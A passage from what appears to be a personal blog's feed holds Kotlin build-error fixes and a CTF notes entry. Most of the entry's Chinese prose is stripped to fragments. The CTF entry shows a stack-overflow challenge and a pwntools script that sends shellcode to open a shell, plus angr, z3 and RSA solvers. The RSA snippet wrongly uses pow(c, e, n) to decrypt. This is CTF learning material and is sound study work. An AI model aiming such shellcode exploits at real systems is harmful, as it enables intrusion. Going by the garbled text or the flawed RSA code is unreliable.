name&gt;.a(ThreadController.cpp.obj):(LibLoader::ThreadController::callThreadEnd(std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; const&amp;, std::function&lt;void ()&gt;))</span><br><span class="line">&gt;&gt;&gt; referenced 16 more times</span><br><span class="line">clang++: error: linker command failed with exit code 1 (use -v to see invocation)</span><br><span class="line"></span><br><span class="line">&gt; Task :&lt;Proj name&gt;:linkDebugExecutableNative FAILED</span><br><span class="line">:&lt;Proj name&gt;:linkDebugExecutableNative (Thread[Execution worker for &#x27;:&#x27;,5,main]) completed. Took 3 mins 10.585 secs.</span><br></pre></td></tr></table></figure><h2 id="1-"><a href="#1-" class="headerlink" title="1. "></a>1. </h2><p> Kotlin&#x2F;Native  GCC 9.2.0 ( <a href="https://youtrack.jetbrains.com/issue/KT-51975/Native-lld-link-error-undefined-symbol-stdthrowbadarraynewlength">KT-51975</a>),  Kotlin&#x2F;Native  cintrop  link  GCC 11.2.0 .</p><h2 id="2-"><a href="#2-" class="headerlink" title="2. "></a>2. </h2><p> GCC 10 &#x2F; 9  link </p>]]></content>
      
      
      <categories>
          
          <category> ErrorSolved </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kotlin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF </title>
      <link href="/2022/10/14/PWN-wr1teups0/"/>
      <url>/2022/10/14/PWN-wr1teups0/</url>
      
        <content type="html"><![CDATA[<h2 id="shellcode-"><a href="#shellcode-" class="headerlink" title="shellcode "></a>shellcode </h2><p>,  <code>flag.txt</code> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// chall.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">char</span> buf[<span class="number">100</span>];</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;&lt;Text 2&gt; %p\n&quot;</span>, buf);</span><br><span class="line">   gets(buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">char</span> sample[<span class="number">20</span>];</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;&lt;Text 1&gt;&quot;</span>);</span><br><span class="line">   fgets(sample, <span class="keyword">sizeof</span>(sample) - <span class="number">1</span>, <span class="built_in">stdin</span>);</span><br><span class="line">   vuln();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc chall.c -o chall -fno-stack-protector -z execstack</span><br></pre></td></tr></table></figure><p> <code>execstack</code> .</p><p> <code>gets</code>  <code>$rbp</code>  <code>system</code> ,  <code>$rdi</code>  <code>/bin/sh</code>  <code>system(&quot;/bin/sh&quot;);</code> ,  <code>system</code> .</p><p>,  <code>shellcode</code> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># solve.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># lib = gdb.debug(&quot;&lt;local file&gt;&quot;)</span></span><br><span class="line">lib = remote(<span class="string">&quot;&lt;remote addr&gt;&quot;</span>, &lt;port&gt;)</span><br><span class="line"><span class="built_in">print</span>(lib.recv())</span><br><span class="line"><span class="comment"># </span></span><br><span class="line">lib.sendline(<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">re = lib.recv()</span><br><span class="line"><span class="built_in">print</span>(re)</span><br><span class="line"><span class="comment"># </span></span><br><span class="line">addr = <span class="built_in">int</span>(re[-<span class="number">15</span>:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(re[-<span class="number">15</span>:-<span class="number">1</span>])</span><br><span class="line"><span class="comment">#  bytes  system(&quot;/bin/sh&quot;);  shellcode</span></span><br><span class="line">bash_bytes = asm(shellcraft.amd64.linux.sh(),arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(bash_bytes))</span><br><span class="line"><span class="comment">#  shellcode ,  overflow  `$rbp` </span></span><br><span class="line">lib.sendline(bash_bytes + <span class="string">b&quot;\x00&quot;</span> * (<span class="number">120</span> - <span class="built_in">len</span>(bash_bytes)) + p64(addr, endian=<span class="string">&quot;little&quot;</span>))</span><br><span class="line"><span class="comment">#  flag.txt </span></span><br><span class="line">lib.sendline(<span class="string">b&quot;cat flag.txt&quot;</span>)</span><br><span class="line">lib.recv()</span><br></pre></td></tr></table></figure><h2 id="angr-"><a href="#angr-" class="headerlink" title="angr "></a>angr </h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// chall.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> key[<span class="number">50</span>] = <span class="string">&quot;_________________&lt;Text_1&gt;______________\xC0\xDE&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">(<span class="type">void</span>)</span> </span><br><span class="line">&#123;</span><br><span class="line">   system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">char</span> input[<span class="number">50</span>];</span><br><span class="line">   fgets(input, <span class="keyword">sizeof</span>(input) - <span class="number">1</span>, <span class="built_in">stdin</span>);</span><br><span class="line">   <span class="keyword">if</span> (<span class="built_in">strlen</span>(input) == <span class="built_in">strlen</span>(key)) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(key); i++) &#123;</span><br><span class="line">         <span class="keyword">if</span> ((input[i] ^ <span class="number">0x27</span>) != key[i]) &#123;</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>,  system <br> Angr <br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc chall.c -o chall</span><br></pre></td></tr></table></figure><p>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># solve.py</span></span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment"># </span></span><br><span class="line">path_to_binary = <span class="string">&quot;./chall&quot;</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">project = angr.Project(path_to_binary)</span><br><span class="line"><span class="comment"># </span></span><br><span class="line">initial_state = project.factory.entry_state()</span><br><span class="line"><span class="comment"># </span></span><br><span class="line">simulation = project.factory.simgr(initial_state)</span><br><span class="line"><span class="comment"># system  (0x400000  Angr  pie  0x400000)</span></span><br><span class="line">print_good_address = <span class="number">0x400924</span> </span><br><span class="line"><span class="comment"># </span></span><br><span class="line">simulation.explore(find=print_good_address)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> simulation.found:</span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line">   <span class="comment"># </span></span><br><span class="line">    solution = solution_state.posix.dumps(sys.stdin.fileno())</span><br><span class="line">    <span class="built_in">print</span>(solution)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find the solution&#x27;</span>)</span><br></pre></td></tr></table></figure><p></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># </span></span><br><span class="line">lib = remote(<span class="string">&quot;&lt;remote addr&gt;&quot;</span>, <span class="number">1111</span>)</span><br><span class="line"><span class="comment"># </span></span><br><span class="line">lib.sendline(<span class="string">b&#x27;cNB@H\x07&#125;FDDFN\x07NT\x07SOB\x07EBTS\x07dtb\x07WUHABTTHU\t\xe7\xf9\x00\x00\x00\x00\x00\x00\x00&#x27;</span>)</span><br><span class="line">lib.interactive()</span><br></pre></td></tr></table></figure><h2 id="angr-2"><a href="#angr-2" class="headerlink" title="angr - 2"></a>angr - 2</h2><p><code>FLAG</code>(<a href="https://github.com/Nambers/ctf-writeups/blob/main/WolvCTF-2023/Reverse-Homework_Help-Easy-Medium/solve.md">WolvCTF23-Rev-Homework_help</a>):</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __stack_chk_fail(<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  <span class="type">long</span> lVar2;</span><br><span class="line">  uint uVar3;</span><br><span class="line">  <span class="type">long</span> in_FS_OFFSET;</span><br><span class="line">  uint local_15c;</span><br><span class="line">  uint auStack344 [<span class="number">2</span>];</span><br><span class="line">  undefined8 local_150;</span><br><span class="line">  undefined8 local_148;</span><br><span class="line">  undefined8 local_140;</span><br><span class="line">  undefined8 local_138;</span><br><span class="line">  undefined8 local_130;</span><br><span class="line">  undefined8 local_128;</span><br><span class="line">  undefined8 local_120;</span><br><span class="line">  undefined8 local_118;</span><br><span class="line">  undefined8 local_110;</span><br><span class="line">  undefined8 local_108;</span><br><span class="line">  undefined8 local_100;</span><br><span class="line">  undefined8 local_f8;</span><br><span class="line">  undefined8 local_f0;</span><br><span class="line">  undefined8 local_e8;</span><br><span class="line">  undefined8 local_e0;</span><br><span class="line">  __jmp_buf_tag local_d8;</span><br><span class="line">  <span class="type">long</span> local_10;</span><br><span class="line">  </span><br><span class="line">  local_10 = *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>);</span><br><span class="line">  auStack344[<span class="number">1</span>] = <span class="number">0x14</span>;</span><br><span class="line">  local_150 = <span class="number">0x1200000017</span>;</span><br><span class="line">  local_148 = <span class="number">0x500000001d</span>;</span><br><span class="line">  local_140 = <span class="number">0x5d00000046</span>;</span><br><span class="line">  local_138 = <span class="number">0x4100000042</span>;</span><br><span class="line">  local_130 = <span class="number">0x330000006c</span>;</span><br><span class="line">  local_128 = <span class="number">0x5a0000005d</span>;</span><br><span class="line">  local_120 = <span class="number">0x3a0000000e</span>;</span><br><span class="line">  local_118 = <span class="number">0x410000006a</span>;</span><br><span class="line">  local_110 = <span class="number">0x5700000040</span>;</span><br><span class="line">  local_108 = <span class="number">0x3400000008</span>;</span><br><span class="line">  local_100 = <span class="number">0xb0000003c</span>;</span><br><span class="line">  local_f8 = <span class="number">0x3400000003</span>;</span><br><span class="line">  local_f0 = <span class="number">0x4600000028</span>;</span><br><span class="line">  local_e8 = <span class="number">0x530000005f</span>;</span><br><span class="line">  local_e0 = <span class="number">0x5000000010</span>;</span><br><span class="line">  local_15c = <span class="number">0x36</span>;</span><br><span class="line">  iVar1 = _setjmp(&amp;local_d8);</span><br><span class="line">  <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">    lVar2 = <span class="number">0</span>;</span><br><span class="line">    uVar3 = <span class="number">0x41</span>;</span><br><span class="line">    <span class="keyword">while</span>( <span class="literal">true</span> ) &#123;</span><br><span class="line">      local_15c = local_15c ^ uVar3;</span><br><span class="line">      <span class="keyword">if</span> ((<span class="type">int</span>)(<span class="type">char</span>)FLAG[lVar2] != local_15c) &#123;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">        __longjmp_chk(&amp;local_d8,<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      lVar2 = lVar2 + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> (lVar2 == <span class="number">0x20</span>) <span class="keyword">break</span>;</span><br><span class="line">      uVar3 = auStack344[lVar2];</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="comment">// addr: 0x13f5</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Well Done.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="comment">// addr: 0x1414</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Nope.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (local_10 == *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">  __stack_chk_fail();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>(?) Angr  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># solve.py</span></span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_successful</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    <span class="comment">#  stdout  Well Done </span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Well Done&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">should_abort</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="comment">#  stdout  Nope </span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Nope&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># , ,  auto_load_libs</span></span><br><span class="line">project = angr.Project(<span class="string">&quot;F:/Downloads/homework_help&quot;</span>, auto_load_libs = <span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(project.loader.find_symbol(<span class="string">&quot;__stack_chk_fail&quot;</span>).rebased_addr)</span><br><span class="line"><span class="comment"># </span></span><br><span class="line">state = project.factory.blank_state(addr=project.loader.find_symbol(<span class="string">&quot;__stack_chk_fail&quot;</span>).rebased_addr)</span><br><span class="line"><span class="comment">#  FLAG  solver ,  Angr  FLAG  is_successful </span></span><br><span class="line"><span class="comment"># , , ,  Ghidra  32 bytes ,  32 * 8 bits </span></span><br><span class="line">flag = state.solver.BVS(<span class="string">&#x27;FLAG&#x27;</span>, <span class="number">32</span> * <span class="number">8</span>)</span><br><span class="line"><span class="comment"># FLAG addr</span></span><br><span class="line"><span class="built_in">print</span>(project.loader.find_symbol(<span class="string">&quot;FLAG&quot;</span>).rebased_addr)</span><br><span class="line"><span class="comment">#  FLAG  FLAG </span></span><br><span class="line">state.memory.store(project.loader.find_symbol(<span class="string">&quot;FLAG&quot;</span>).rebased_addr, flag)</span><br><span class="line"><span class="comment"># </span></span><br><span class="line">simulation = project.factory.simulation_manager(state)</span><br><span class="line"><span class="comment"># , </span></span><br><span class="line">simulation.one_active.options.add(angr.options.LAZY_SOLVES)</span><br><span class="line"><span class="comment">#  puts(&quot;Well Done.&quot;)  puts(&quot;Nope.&quot;)  find , </span></span><br><span class="line">simulation.explore(find=[is_successful, <span class="number">0x004013f5</span>] , avoid=[should_abort, <span class="number">0x401414</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> deadended <span class="keyword">in</span> simulation.deadended:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Valid memory access triggered by %s&quot;</span> % <span class="built_in">repr</span>(deadended.posix.dumps(<span class="number">0</span>)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> errored <span class="keyword">in</span> simulation.errored:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;%s caused by %s&quot;</span> % (errored.error, <span class="built_in">repr</span>(errored.state.posix.dumps(<span class="number">0</span>))))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> simulation.found:</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> simulation.found:</span><br><span class="line">      <span class="comment">#  stdin </span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;input:&quot;</span>, s.posix.dumps(<span class="number">0</span>))</span><br><span class="line">      <span class="comment">#  stdout</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;output:&quot;</span>, s.posix.dumps(<span class="number">1</span>))</span><br><span class="line">      <span class="comment">#  is_successful  FLAG </span></span><br><span class="line">        <span class="built_in">print</span>(s.solver.<span class="built_in">eval</span>(flag, cast_to=<span class="built_in">bytes</span>).decode())</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find the solution&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h2><p> N, E  C ,  RSA .<br> RSA ,  RsaCtfTool  yafu  (x)<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Crypto.Util.number <span class="keyword">as</span> cun</span><br><span class="line"></span><br><span class="line">n = <span class="comment">#</span></span><br><span class="line">e = <span class="comment">#</span></span><br><span class="line">c = <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">p = <span class="built_in">pow</span>(c, e, n)</span><br><span class="line"><span class="built_in">print</span>(cun.long_to_bytes(p))</span><br></pre></td></tr></table></figure><p>, .  </p><h2 id="Z3-solver"><a href="#Z3-solver" class="headerlink" title="Z3 solver"></a>Z3 solver</h2><p>z3 solver  python .<br> <a href="https://github.com/Nambers/ctf-writeups/blob/main/hack-a-sat-qual-2023/based_emoji%20(late)/solve.md">hack-a-sat chal</a> 32 , ,  z3 solver chal, .  </p>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>KotlinSourceSet with name &#39;unixMain&#39; not found.</title>
      <link href="/2022/09/23/kotlin-mpp-sourceset-not-found/"/>
      <url>/2022/09/23/kotlin-mpp-sourceset-not-found/</url>
      
        <content type="html"><![CDATA[<h2 id="0-"><a href="#0-" class="headerlink" title="0. "></a>0. </h2><p>build.gradle.kt</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">plugins &#123;</span><br><span class="line">    kotlin(<span class="string">&quot;multiplatform&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">group = <span class="string">&quot;tech.eritquearcus&quot;</span></span><br><span class="line">version = <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">kotlin &#123;</span><br><span class="line">    jvm &#123;</span><br><span class="line">        compilations.all &#123;</span><br><span class="line">            kotlinOptions.jvmTarget = <span class="string">&quot;1.8&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        withJava()</span><br><span class="line">        testRuns[<span class="string">&quot;test&quot;</span>].executionTask.configure &#123;</span><br><span class="line">            useJUnitPlatform()</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">val</span> hostOs = System.getProperty(<span class="string">&quot;os.name&quot;</span>)</span><br><span class="line">    <span class="keyword">val</span> isMingwX64 = hostOs.startsWith(<span class="string">&quot;Windows&quot;</span>)</span><br><span class="line">    <span class="keyword">val</span> nativeTarget = <span class="keyword">when</span> &#123;</span><br><span class="line">        hostOs == <span class="string">&quot;Mac OS X&quot;</span> -&gt; macosX64(<span class="string">&quot;unix&quot;</span>)</span><br><span class="line">        hostOs == <span class="string">&quot;Linux&quot;</span> -&gt; linuxX64(<span class="string">&quot;unix&quot;</span>)</span><br><span class="line">        isMingwX64 -&gt; mingwX64(<span class="string">&quot;win&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span> -&gt; <span class="keyword">throw</span> GradleException(<span class="string">&quot;Host OS is not supported in Kotlin/Native.&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    sourceSets &#123;</span><br><span class="line">        <span class="keyword">val</span> commonMain <span class="keyword">by</span> getting &#123;</span><br><span class="line">            dependencies &#123;</span><br><span class="line">  </span><br><span class="line">            &#125;</span><br><span class="line">            apply(plugin = <span class="string">&quot;org.jetbrains.kotlin.plugin.serialization&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">val</span> jvmMain <span class="keyword">by</span> getting</span><br><span class="line">        <span class="keyword">val</span> unixMain <span class="keyword">by</span> getting</span><br><span class="line">        <span class="keyword">val</span> winMain <span class="keyword">by</span> getting</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>,  <code>unixMain</code>  <code>winMain</code>  mac&#x2F;linux , <code>jvmMain</code>  java .<br> <code>src</code>  <code>unixMain</code>  <code>winMain</code> , ( <code>jvmMain</code>  <code>nativeMain</code> ), :<br><img src="/images/kotlin-mpp.jpg" alt="file struct"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">KotlinSourceSet with name &#x27;unixMain&#x27; not found.</span><br><span class="line"></span><br><span class="line">* Try:</span><br><span class="line">&gt; Run with --info or --debug option to get more log output.</span><br><span class="line">&gt; Run with --scan to get full insights.</span><br><span class="line"></span><br><span class="line">* Exception is:</span><br><span class="line">org.gradle.api.UnknownDomainObjectException: KotlinSourceSet with name &#x27;unixMain&#x27; not found.</span><br><span class="line">   at org.gradle.api.internal.DefaultNamedDomainObjectCollection.createNotFoundException(DefaultNamedDomainObjectCollection.java:504)</span><br><span class="line">   at org.gradle.api.internal.DefaultNamedDomainObjectCollection.getByName(DefaultNamedDomainObjectCollection.java:333)</span><br><span class="line">   at org.gradle.kotlin.dsl.NamedDomainObjectCollectionDelegateProvider.provideDelegate(NamedDomainObjectCollectionExtensions.kt:384)</span><br><span class="line">   at Build_gradle$1$2.execute(build.gradle.kts:53)</span><br><span class="line">   at Build_gradle$1$2.execute(build.gradle.kts:1)</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><h2 id="1-"><a href="#1-" class="headerlink" title="1. "></a>1. </h2><p></p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">val</span> unixMain = maybeCreate(<span class="string">&quot;unixMain&quot;</span>).apply &#123;</span><br><span class="line">    <span class="keyword">this</span>.dependsOn(commonMain)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">val</span> winMain = maybeCreate(<span class="string">&quot;winMain&quot;</span>).apply &#123;</span><br><span class="line">    <span 